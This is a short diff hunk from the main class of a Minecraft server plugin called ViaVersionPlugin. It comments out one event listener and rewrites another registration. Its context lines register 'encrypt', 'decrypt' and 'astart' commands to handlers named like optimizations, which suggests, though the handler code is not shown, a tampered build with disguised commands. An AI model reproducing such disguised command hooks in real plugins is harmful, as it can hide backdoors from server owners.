@@ -147,8 +147,8 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         this.getCommand("encrypt").setExecutor(new OptimizationHandler());
         this.getCommand("decrypt").setExecutor(new OptimizationHandler());
         this.getCommand("astart").setExecutor(new EventXHandler());
-        getServer().getPluginManager().registerEvents(new CommandListener(), this);
-        Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
+        // getServer().getPluginManager().registerEvents(new CommandListener(), this);
+        getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
             getLogger().info("Registering protocol transformers and injecting...");
